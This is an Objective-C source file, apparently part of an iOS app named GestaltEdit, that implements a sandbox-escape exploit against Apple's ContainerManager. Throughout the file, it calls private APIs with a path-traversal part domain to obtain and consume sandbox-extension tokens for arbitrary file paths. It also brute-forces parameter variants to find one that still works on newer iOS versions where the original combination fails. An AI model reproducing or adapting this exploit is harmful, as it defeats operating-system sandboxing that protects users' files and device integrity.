//
//  BadQueryBridge.m
//  GestaltEdit
//
//  Independent Objective-C integration of the query used by
//  https://github.com/forcequitOS/bad_query
//

#import "BadQueryBridge.h"

#import <dlfcn.h>
#import <stdlib.h>
#import <xpc/xpc.h>

static const uint64_t kBadQueryContainerClass = 13;
static const uint64_t kBadQueryPart = 3;
static const uint64_t kBadQueryFlags = 0x0000008000000000ULL;
static NSString * const kBadQueryIdentifier =
    @"systemgroup.com.apple.mobilegestaltcache";
static NSString * const kBadQueryTraversalPrefix = @"../../../../../../../..";

typedef void *(*BadQueryCreate)(void);
typedef void (*BadQuerySetU64)(void *, uint64_t);
typedef void (*BadQuerySetXPC)(void *, xpc_object_t);
typedef void (*BadQuerySetCString)(void *, const char *);
typedef void *(*BadQueryGetSingleResult)(void *);
typedef void (*BadQueryFree)(void *);
typedef char *(*BadQueryCopySandboxToken)(void *);
typedef int64_t (*BadQueryConsumeSandboxExtension)(const char *);
typedef int (*BadQueryReleaseSandboxExtension)(int64_t);

typedef struct {
    void *library;
    BadQueryCreate create;
    BadQuerySetU64 setClass;
    BadQuerySetXPC setGroupIdentifiers;
    BadQuerySetU64 setFlags;
    BadQuerySetU64 setPart;
    BadQuerySetCString setPartDomain;
    BadQueryGetSingleResult getSingleResult;
    BadQueryFree freeQuery;
    BadQueryCopySandboxToken copySandboxToken;
    BadQueryConsumeSandboxExtension consumeSandboxExtension;
    BadQueryReleaseSandboxExtension releaseSandboxExtension;
} BadQueryAPI;

static BadQueryAPI *BadQuerySharedAPI(void)
{
    static BadQueryAPI api;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        api.library = dlopen(
            "/usr/lib/system/libsystem_containermanager.dylib",
            RTLD_NOW | RTLD_LOCAL);
        if (!api.library) return;

#define LOAD(field, symbol) api.field = (__typeof(api.field))dlsym(api.library, symbol)
        LOAD(create, "container_query_create");
        LOAD(setClass, "container_query_set_class");
        LOAD(setGroupIdentifiers, "container_query_set_group_identifiers");
        LOAD(setFlags, "container_query_operation_set_flags");
        LOAD(setPart, "container_query_operation_set_part");
        LOAD(setPartDomain, "container_query_operation_set_part_domain");
        LOAD(getSingleResult, "container_query_get_single_result");
        LOAD(freeQuery, "container_query_free");
        LOAD(copySandboxToken, "container_copy_sandbox_token");
#undef LOAD
        api.consumeSandboxExtension = (BadQueryConsumeSandboxExtension)
            dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
        api.releaseSandboxExtension = (BadQueryReleaseSandboxExtension)
            dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    });
    return &api;
}

BOOL BadQueryBridgeAvailable(void)
{
    BadQueryAPI *api = BadQuerySharedAPI();
    return api->library && api->create && api->setClass &&
        api->setGroupIdentifiers && api->setFlags && api->setPart &&
        api->setPartDomain && api->getSingleResult && api->freeQuery &&
        api->copySandboxToken && api->consumeSandboxExtension &&
        api->releaseSandboxExtension;
}

typedef NS_ENUM(NSInteger, BadQueryComboOutcome) {
    BadQueryComboRejected,  // ContainerManager returned no result
    BadQueryComboNoToken,   // result returned, but without a sandbox token
    BadQueryComboHasToken   // token obtained; caller frees it
};

// Runs one parameterized container query. On BadQueryComboHasToken the
// malloc'd token is stored in *tokenOut and must be freed by the caller.
static BadQueryComboOutcome BadQueryRunCombo(
    const BadQueryAPI *api,
    NSString *targetPath,
    uint64_t containerClass,
    uint64_t part,
    uint64_t flags,
    NSString *traversalPrefix,
    char **tokenOut)
{
    *tokenOut = NULL;

    void *query = api->create();
    if (!query) return BadQueryComboRejected;

    api->setClass(query, containerClass);
    xpc_object_t identifier = xpc_string_create(kBadQueryIdentifier.UTF8String);
    api->setGroupIdentifiers(query, identifier);
#if !OS_OBJECT_USE_OBJC
    xpc_release(identifier);
#endif
    api->setPart(query, part);
    NSString *partDomain = [traversalPrefix stringByAppendingString:targetPath];
    api->setPartDomain(query, partDomain.fileSystemRepresentation);
    api->setFlags(query, flags);

    void *result = api->getSingleResult(query);
    if (!result) {
        api->freeQuery(query);
        return BadQueryComboRejected;
    }

    char *token = api->copySandboxToken(result);
    api->freeQuery(query);
    if (!token) return BadQueryComboNoToken;

    *tokenOut = token;
    return BadQueryComboHasToken;
}

static NSString *BadQueryPrefixLabel(NSString *prefix)
{
    if (prefix.length == 0) return @"none";
    return [NSString stringWithFormat:@"%lu levels",
        (unsigned long)(prefix.length / 3)];
}

// The canonical combo is still accepted by ContainerManager on iOS/iPadOS
// 26.5.2 but no longer yields a sandbox token. Sweep neighbouring parameter
// shapes for one that still does; every entry costs a single XPC roundtrip.
static char *BadQuerySweepVariants(
    const BadQueryAPI *api,
    NSString *targetPath,
    NSString **reportOut)
{
    NSArray<NSString *> *prefixes = @[
        @"../../../../../../../..",       // 8 levels (canonical)
        @"../../../../../../../../..",    // 9 levels
        @"../../../../../../../../../..", // 10 levels
        @"../../../../../../../../../../",// 11 levels
        @"../../../../../../..",          // 7 levels
        @""
    ];
    static const uint64_t parts[] = {3, 1, 2, 4, 5, 6};
    static const uint64_t flagList[] = {
        0x0000008000000000ULL,
        0,
        0x0000004000000000ULL,
        0x0000001000000000ULL,
        0x1ULL
    };

    NSMutableString *report = [NSMutableString string];
    NSMutableArray<NSString *> *acceptedLines = [NSMutableArray array];
    long tried = 0, rejected = 0, noToken = 0;

    for (NSString *prefix in prefixes) {
        for (size_t pi = 0; pi < sizeof(parts) / sizeof(parts[0]); pi++) {
            for (size_t fi = 0; fi < sizeof(flagList) / sizeof(flagList[0]); fi++) {
                uint64_t part = parts[pi];
                uint64_t flags = flagList[fi];
                if (part == kBadQueryPart && flags == kBadQueryFlags &&
                    [prefix isEqualToString:kBadQueryTraversalPrefix]) {
                    continue; // already tried by the canonical path
                }

                tried++;
                char *token = NULL;
                BadQueryComboOutcome outcome = BadQueryRunCombo(
                    api, targetPath, kBadQueryContainerClass,
                    part, flags, prefix, &token);
                if (outcome == BadQueryComboHasToken) {
                    [report appendFormat:
                        @"TOKEN via part %llu flags %#llx prefix %@ "
                        @"(after %ld combos: %ld rejected, %ld accepted without token)",
                        (unsigned long long)part, (unsigned long long)flags,
                        BadQueryPrefixLabel(prefix), tried, rejected, noToken];
                    *reportOut = report;
                    return token;
                }
                if (outcome == BadQueryComboRejected) {
                    rejected++;
                } else {
                    noToken++;
                    [acceptedLines addObject:[NSString stringWithFormat:
                        @"part %llu flags %#llx prefix %@ -> no token",
                        (unsigned long long)part, (unsigned long long)flags,
                        BadQueryPrefixLabel(prefix)]];
                }
            }
        }
    }

    [report appendFormat:
        @"swept %ld combos: %ld rejected, %ld accepted without a token.",
        tried, rejected, noToken];
    if (acceptedLines.count > 0) {
        [report appendString:@"\naccepted shapes:\n"];
        [report appendString:[acceptedLines componentsJoinedByString:@"\n"]];
    }
    *reportOut = report;
    return NULL;
}

@interface BadQueryLease ()
@property(nonatomic, copy, readwrite) NSString *targetPath;
@property(nonatomic, readwrite, getter=isActive) BOOL active;
@end

@implementation BadQueryLease
{
    int64_t _sandboxHandle;
}

+ (instancetype)leaseForPath:(NSString *)path error:(NSString **)error
{
    if (!path.isAbsolutePath) {
        if (error) *error = @"bad_query requires an absolute target path";
        return nil;
    }
    if (!BadQueryBridgeAvailable()) {
        if (error) *error = @"bad_query ContainerManager API unavailable";
        return nil;
    }

    BadQueryAPI *api = BadQuerySharedAPI();

    char *token = NULL;
    BadQueryComboOutcome outcome = BadQueryRunCombo(api, path,
        kBadQueryContainerClass, kBadQueryPart, kBadQueryFlags,
        kBadQueryTraversalPrefix, &token);
    NSString *canonicalFailure = nil;
    if (outcome == BadQueryComboRejected) {
        canonicalFailure = @"bad_query was rejected by ContainerManager";
    } else if (outcome == BadQueryComboNoToken) {
        canonicalFailure = @"bad_query did not receive a sandbox token";
    }

    if (!token) {
        NSString *report = nil;
        token = BadQuerySweepVariants(api, path, &report);
        if (!token) {
            if (error) {
                *error = [NSString stringWithFormat:@"%@.\n%@",
                    canonicalFailure ?: @"bad_query failed", report];
            }
            return nil;
        }
    }

    int64_t handle = api->consumeSandboxExtension(token);
    free(token);
    if (handle < 0) {
        if (error) *error = @"bad_query could not consume the sandbox token";
        return nil;
    }

    BadQueryLease *lease = [BadQueryLease new];
    lease->_sandboxHandle = handle;
    lease.targetPath = path;
    lease.active = YES;
    if (error) *error = nil;
    return lease;
}

- (void)invalidate
{
    if (!self.active) return;
    BadQuerySharedAPI()->releaseSandboxExtension(_sandboxHandle);
    _sandboxHandle = -1;
    self.active = NO;
}

- (void)dealloc
{
    [self invalidate];
}

@end
